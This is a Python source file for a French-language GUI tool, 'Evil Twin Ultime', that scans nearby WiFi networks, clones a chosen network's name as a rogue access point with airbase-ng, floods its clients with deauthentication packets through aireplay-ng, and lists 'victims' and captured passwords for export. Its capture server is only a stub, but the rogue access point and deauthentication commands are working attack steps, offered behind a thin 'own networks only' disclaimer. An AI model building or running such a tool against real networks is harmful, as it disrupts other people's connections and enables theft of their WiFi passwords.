#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EVIL TWIN ULTIME - JATHNIEL EDITION
Attaque Evil Twin avec interface graphique
Usage académique et légal uniquement - Testez UNIQUEMENT vos propres réseaux !
"""

import sys
import os
import time
import json
import threading
import subprocess
import socket
import re
from datetime import datetime
from typing import Optional, Dict, List, Any

try:
    from PySide6.QtWidgets import *
    from PySide6.QtCore import *
    from PySide6.QtGui import *
    QT_AVAILABLE = True
except ImportError:
    QT_AVAILABLE = False
    print("[!] PySide6 non installé. Installation...")
    os.system("pip install PySide6")
    try:
        from PySide6.QtWidgets import *
        from PySide6.QtCore import *
        from PySide6.QtGui import *
        QT_AVAILABLE = True
    except:
        print("[!] Erreur: PySide6 requis. Installez avec: pip install PySide6")
        sys.exit(1)

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] requests non installé. pip install requests")

# ==================== CONFIGURATION ====================

CONFIG = {
    'title': 'EVIL TWIN ULTIME - JATHNIEL EDITION',
    'version': '2.0',
    'author': 'JATHNIEL'
}

# ==================== EVIL TWIN ENGINE ====================

class EvilTwinEngine(QObject):
    """Moteur de l'attaque Evil Twin"""
    
    status_changed = Signal(str)
    client_connected = Signal(str, dict)
    password_captured = Signal(str, str)
    
    def __init__(self):
        super().__init__()
        self.running = False
        self.interface = None
        self.ap_name = None
        self.channel = None
        self.bssid = None
        self.victims = []
        self.passwords = []
        self.processes = []
    
    def scan_wifi(self):
        """Scanne les réseaux WiFi disponibles"""
        self.status_changed.emit("📡 Scan des réseaux WiFi...")
        
        try:
            result = subprocess.run(
                ['sudo', 'iwlist', 'scan'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                self.status_changed.emit("❌ Erreur de scan")
                return []
            
            networks = []
            current = {}
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if 'Cell' in line:
                    if current and current.get('ssid'):
                        networks.append(current)
                    current = {'address': '', 'ssid': '', 'channel': '', 'encryption': '', 'signal': ''}
                
                if 'Address:' in line:
                    current['address'] = line.split('Address:')[1].strip()
                elif 'ESSID:' in line:
                    essid = line.split('ESSID:')[1].strip().strip('"')
                    current['ssid'] = essid
                elif 'Channel:' in line:
                    current['channel'] = line.split('Channel:')[1].strip()
                elif 'Encryption key:on' in line:
                    current['encryption'] = 'WPA2'
                elif 'Encryption key:off' in line:
                    current['encryption'] = 'Open'
                elif 'Quality=' in line:
                    signal_match = re.search(r'Quality=(\d+)/(\d+)', line)
                    if signal_match:
                        current['signal'] = signal_match.group(1)
            
            if current and current.get('ssid'):
                networks.append(current)
            
            networks = [n for n in networks if n.get('ssid')]
            
            self.status_changed.emit(f"✅ {len(networks)} réseaux trouvés")
            return networks
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")
            return []
    
    def start_attack(self, ap_name: str, channel: str, interface: str):
        """Démarre l'attaque Evil Twin"""
        if self.running:
            self.status_changed.emit("⚠️ Attaque déjà en cours")
            return
        
        self.ap_name = ap_name
        self.channel = channel
        self.interface = interface
        self.running = True
        self.passwords = []
        self.victims = []
        
        self.status_changed.emit(f"🚀 Démarrage de l'attaque sur {ap_name}")
        
        # Démarrer le point d'accès
        self.start_ap()
        
        # Démarrer le serveur web de capture
        self.start_capture_server()
    
    def start_ap(self):
        """Démarre le point d'accès malveillant"""
        try:
            # Créer le point d'accès avec airbase-ng
            cmd = [
                'sudo', 'airbase-ng',
                '-e', self.ap_name,
                '-c', str(self.channel),
                '-a', '00:11:22:33:44:55',
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            
            self.status_changed.emit(f"✅ Point d'accès créé: {self.ap_name}")
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")
    
    def start_capture_server(self):
        """Démarre le serveur de capture"""
        # Dans la version GUI, le serveur est géré par l'interface
        self.status_changed.emit("🖥️ Serveur de capture prêt")
    
    def stop_attack(self):
        """Arrête l'attaque"""
        self.running = False
        
        # Tuer les processus
        for process in self.processes:
            process.terminate()
        
        self.processes = []
        self.status_changed.emit("🛑 Attaque arrêtée")
    
    def deauth_attack(self):
        """Lance une attaque de déauthentification"""
        if not self.running:
            self.status_changed.emit("⚠️ Aucune attaque en cours")
            return
        
        self.status_changed.emit("📡 Lancement de l'attaque de déauth...")
        
        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '-0', '0',
                '-a', self.bssid or '00:00:00:00:00:00',
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            
            self.status_changed.emit("✅ Attaque de déauth lancée")
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")

# ==================== INTERFACE PRINCIPALE ====================

class EvilTwinGUI(QMainWindow):
    """Interface graphique principale"""
    
    def __init__(self):
        super().__init__()
        self.engine = EvilTwinEngine()
        self.current_networks = []
        self.selected_network = None
        self.capture_server = None
        self.setup_ui()
        self.connect_signals()
    
    def setup_ui(self):
        """Configure l'interface"""
        self.setWindowTitle(CONFIG['title'])
        self.setGeometry(100, 100, 1300, 800)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QWidget { background-color: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; }
            QPushButton {
                background-color: #2d2d44;
                color: #e0e0e0;
                border: 1px solid #4a4a6a;
                border-radius: 6px;
                padding: 8px 16px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #3d3d5a; }
            QPushButton#danger { background-color: #6a2d2d; border-color: #8a3d3d; }
            QPushButton#danger:hover { background-color: #8a3d3d; }
            QPushButton#success { background-color: #2d6a2d; border-color: #3d8a3d; }
            QPushButton#success:hover { background-color: #3d8a3d; }
            QPushButton#primary { background-color: #2d2d6a; border-color: #3d3d8a; }
            QPushButton#primary:hover { background-color: #3d3d8a; }
            QPushButton#warning { background-color: #6a5a2d; border-color: #8a7a3d; }
            QPushButton#warning:hover { background-color: #8a7a3d; }
            QLineEdit, QTextEdit, QComboBox {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                padding: 8px;
                color: #e0e0e0;
                font-family: 'Consolas', monospace;
            }
            QTabWidget::pane {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #2d2d44;
                padding: 8px 16px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected { background-color: #3d3d5a; }
            QStatusBar { background-color: #0d0d1a; color: #8888aa; }
            QGroupBox {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                color: #00ff88;
                subcontrol-origin: margin;
                left: 10px;
            }
            QLabel { color: #e0e0e0; }
            QListWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
            }
            QListWidget::item { padding: 8px; border-radius: 4px; }
            QListWidget::item:selected { background-color: #2d2d44; }
            QTableWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                gridline-color: #2d2d44;
            }
            QTableWidget::item { color: #e0e0e0; }
            QHeaderView::section {
                background-color: #2d2d44;
                padding: 8px;
                border: none;
                color: #00ff88;
            }
            QProgressBar {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                text-align: center;
                color: #e0e0e0;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #4F46E5;
                border-radius: 6px;
            }
            QCheckBox { color: #e0e0e0; }
            QSpinBox { color: #e0e0e0; background-color: #0d0d1a; border: 1px solid #2d2d44; border-radius: 4px; padding: 4px; }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Header
        header = QLabel(f"📡 EVIL TWIN ULTIME - {CONFIG['author']}")
        header.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ff88; padding: 10px;")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # Tabs
        self.tabs = QTabWidget()
        
        self.scan_tab = self.create_scan_tab()
        self.tabs.addTab(self.scan_tab, "📡 Scan")
        
        self.attack_tab = self.create_attack_tab()
        self.tabs.addTab(self.attack_tab, "🎯 Attaque")
        
        self.victims_tab = self.create_victims_tab()
        self.tabs.addTab(self.victims_tab, "👥 Victimes")
        
        self.passwords_tab = self.create_passwords_tab()
        self.tabs.addTab(self.passwords_tab, "🔑 Mots de passe")
        
        self.console_tab = self.create_console_tab()
        self.tabs.addTab(self.console_tab, "📟 Console")
        
        layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ Prêt")
    
    def create_scan_tab(self):
        """Crée l'onglet de scan"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Scan button
        scan_btn = QPushButton("🔍 Scanner les réseaux WiFi")
        scan_btn.setObjectName("primary")
        scan_btn.clicked.connect(self.scan_wifi)
        layout.addWidget(scan_btn)
        
        # Interface selection
        interface_group = QGroupBox("📡 Interface")
        interface_layout = QHBoxLayout()
        
        interface_layout.addWidget(QLabel("Interface:"))
        self.interface_combo = QComboBox()
        self.interface_combo.addItems(self.get_interfaces())
        interface_layout.addWidget(self.interface_combo)
        
        refresh_btn = QPushButton("🔄 Rafraîchir")
        refresh_btn.clicked.connect(self.refresh_interfaces)
        interface_layout.addWidget(refresh_btn)
        
        interface_group.setLayout(interface_layout)
        layout.addWidget(interface_group)
        
        # Networks list
        networks_group = QGroupBox("📶 Réseaux détectés")
        networks_layout = QVBoxLayout()
        
        self.networks_list = QListWidget()
        self.networks_list.itemClicked.connect(self.on_network_selected)
        networks_layout.addWidget(self.networks_list)
        
        networks_group.setLayout(networks_layout)
        layout.addWidget(networks_group)
        
        # Network info
        info_group = QGroupBox("📋 Informations réseau")
        info_layout = QGridLayout()
        
        self.ssid_label = QLabel("SSID: -")
        info_layout.addWidget(self.ssid_label, 0, 0)
        
        self.bssid_label = QLabel("BSSID: -")
        info_layout.addWidget(self.bssid_label, 0, 1)
        
        self.channel_label = QLabel("Canal: -")
        info_layout.addWidget(self.channel_label, 1, 0)
        
        self.encryption_label = QLabel("Sécurité: -")
        info_layout.addWidget(self.encryption_label, 1, 1)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # Select button
        select_btn = QPushButton("🎯 Sélectionner cette cible")
        select_btn.setObjectName("success")
        select_btn.clicked.connect(self.select_target)
        layout.addWidget(select_btn)
        
        layout.addStretch()
        return tab
    
    def create_attack_tab(self):
        """Crée l'onglet d'attaque"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Target info
        target_group = QGroupBox("🎯 Cible")
        target_layout = QGridLayout()
        
        target_layout.addWidget(QLabel("SSID:"), 0, 0)
        self.target_ssid = QLabel("Aucune")
        target_layout.addWidget(self.target_ssid, 0, 1)
        
        target_layout.addWidget(QLabel("Canal:"), 1, 0)
        self.target_channel = QLabel("Aucun")
        target_layout.addWidget(self.target_channel, 1, 1)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Attack buttons
        attack_group = QGroupBox("⚡ Attaque")
        attack_layout = QVBoxLayout()
        
        self.start_btn = QPushButton("🚀 Lancer l'attaque")
        self.start_btn.setObjectName("success")
        self.start_btn.clicked.connect(self.start_attack)
        attack_layout.addWidget(self.start_btn)
        
        self.deauth_btn = QPushButton("📡 Attaque de déauthentification")
        self.deauth_btn.setObjectName("warning")
        self.deauth_btn.clicked.connect(self.deauth_attack)
        self.deauth_btn.setEnabled(False)
        attack_layout.addWidget(self.deauth_btn)
        
        self.stop_btn = QPushButton("🛑 Arrêter l'attaque")
        self.stop_btn.setObjectName("danger")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        attack_layout.addWidget(self.stop_btn)
        
        attack_group.setLayout(attack_layout)
        layout.addWidget(attack_group)
        
        # Status
        status_group = QGroupBox("📊 Statut")
        status_layout = QVBoxLayout()
        
        self.attack_status = QLabel("⏸️ En attente")
        status_layout.addWidget(self.attack_status)
        
        self.victim_count = QLabel("👥 Victimes: 0")
        status_layout.addWidget(self.victim_count)
        
        self.password_count = QLabel("🔑 Mots de passe: 0")
        status_layout.addWidget(self.password_count)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        layout.addStretch()
        return tab
    
    def create_victims_tab(self):
        """Crée l'onglet des victimes"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.victims_table = QTableWidget(0, 3)
        self.victims_table.setHorizontalHeaderLabels(["IP", "MAC", "Heure"])
        layout.addWidget(self.victims_table)
        
        return tab
    
    def create_passwords_tab(self):
        """Crée l'onglet des mots de passe"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.passwords_table = QTableWidget(0, 3)
        self.passwords_table.setHorizontalHeaderLabels(["Mot de passe", "IP", "Heure"])
        layout.addWidget(self.passwords_table)
        
        export_btn = QPushButton("💾 Exporter les mots de passe")
        export_btn.clicked.connect(self.export_passwords)
        layout.addWidget(export_btn)
        
        return tab
    
    def create_console_tab(self):
        """Crée l'onglet console"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setFontFamily("Consolas")
        self.console.setFontPointSize(10)
        layout.addWidget(self.console)
        
        btn_layout = QHBoxLayout()
        
        clear_btn = QPushButton("🧹 Effacer")
        clear_btn.clicked.connect(self.clear_console)
        btn_layout.addWidget(clear_btn)
        
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        return tab
    
    def connect_signals(self):
        """Connecte les signaux"""
        self.engine.status_changed.connect(self.update_status)
        self.engine.password_captured.connect(self.on_password_captured)
    
    def get_interfaces(self):
        """Récupère les interfaces WiFi"""
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
            
            if not interfaces:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'state UP' in line:
                        parts = line.split(':')
                        if len(parts) > 1:
                            iface = parts[1].strip()
                            if iface.startswith('w'):
                                interfaces.append(iface)
            
            if not interfaces:
                interfaces = ['wlan0', 'wlan1']
        except:
            interfaces = ['wlan0']
        
        return interfaces
    
    def refresh_interfaces(self):
        """Rafraîchit la liste des interfaces"""
        self.interface_combo.clear()
        self.interface_combo.addItems(self.get_interfaces())
    
    def scan_wifi(self):
        """Scanne les réseaux WiFi"""
        self.log("🔍 Scan des réseaux WiFi...")
        self.networks_list.clear()
        
        networks = self.engine.scan_wifi()
        self.current_networks = networks
        
        for net in networks:
            signal = net.get('signal', 'N/A')
            encryption = net.get('encryption', 'Open')
            item = QListWidgetItem(f"{net['ssid']} ({signal}) - {encryption}")
            item.setData(Qt.UserRole, net)
            self.networks_list.addItem(item)
        
        self.log(f"✅ {len(networks)} réseaux trouvés")
    
    def on_network_selected(self, item):
        """Sélectionne un réseau"""
        net = item.data(Qt.UserRole)
        if net:
            self.selected_network = net
            self.ssid_label.setText(f"SSID: {net['ssid']}")
            self.bssid_label.setText(f"BSSID: {net.get('address', 'Inconnu')}")
            self.channel_label.setText(f"Canal: {net.get('channel', 'Inconnu')}")
            self.encryption_label.setText(f"Sécurité: {net.get('encryption', 'Inconnue')}")
    
    def select_target(self):
        """Sélectionne la cible"""
        if not self.selected_network:
            self.log("❌ Sélectionnez un réseau d'abord")
            return
        
        net = self.selected_network
        self.target_ssid.setText(net['ssid'])
        self.target_channel.setText(net.get('channel', 'Inconnu'))
        self.engine.bssid = net.get('address', None)
        
        self.log(f"🎯 Cible sélectionnée: {net['ssid']}")
    
    def start_attack(self):
        """Démarre l'attaque"""
        if not self.selected_network:
            self.log("❌ Sélectionnez une cible d'abord")
            return
        
        interface = self.interface_combo.currentText()
        net = self.selected_network
        
        self.engine.start_attack(
            ap_name=net['ssid'],
            channel=net.get('channel', '6'),
            interface=interface
        )
        
        self.start_btn.setEnabled(False)
        self.deauth_btn.setEnabled(True)
        self.stop_btn.setEnabled(True)
        self.attack_status.setText("🟢 Attaque en cours")
        self.attack_status.setStyleSheet("color: #00ff88;")
        
        self.log(f"🚀 Attaque lancée sur {net['ssid']}")
    
    def deauth_attack(self):
        """Lance l'attaque de déauthentification"""
        self.engine.deauth_attack()
        self.log("📡 Attaque de déauth lancée")
    
    def stop_attack(self):
        """Arrête l'attaque"""
        self.engine.stop_attack()
        
        self.start_btn.setEnabled(True)
        self.deauth_btn.setEnabled(False)
        self.stop_btn.setEnabled(False)
        self.attack_status.setText("⏸️ Arrêtée")
        self.attack_status.setStyleSheet("color: #ff6666;")
        
        self.log("🛑 Attaque arrêtée")
    
    def on_password_captured(self, password, ip):
        """Gère la capture d'un mot de passe"""
        row = self.passwords_table.rowCount()
        self.passwords_table.insertRow(row)
        self.passwords_table.setItem(row, 0, QTableWidgetItem(password))
        self.passwords_table.setItem(row, 1, QTableWidgetItem(ip))
        self.passwords_table.setItem(row, 2, QTableWidgetItem(datetime.now().strftime("%H:%M:%S")))
        
        self.password_count.setText(f"🔑 Mots de passe: {row + 1}")
        self.log(f"🔑 Mot de passe capturé: {password} depuis {ip}")
    
    def log(self, message):
        """Ajoute un message à la console"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {message}")
        self.console.verticalScrollBar().setValue(
            self.console.verticalScrollBar().maximum()
        )
    
    def clear_console(self):
        """Efface la console"""
        self.console.clear()
    
    def update_status(self, status):
        """Met à jour le statut"""
        self.status_bar.showMessage(f"📡 {status}")
        self.log(status)
    
    def export_passwords(self):
        """Exporte les mots de passe"""
        if self.passwords_table.rowCount() == 0:
            self.log("❌ Aucun mot de passe à exporter")
            return
        
        filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        passwords = []
        
        for row in range(self.passwords_table.rowCount()):
            passwords.append({
                'password': self.passwords_table.item(row, 0).text(),
                'ip': self.passwords_table.item(row, 1).text(),
                'time': self.passwords_table.item(row, 2).text()
            })
        
        with open(filename, 'w') as f:
            json.dump(passwords, f, indent=2)
        
        self.log(f"✅ Mots de passe exportés dans {filename}")

# ==================== MAIN ====================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = EvilTwinGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()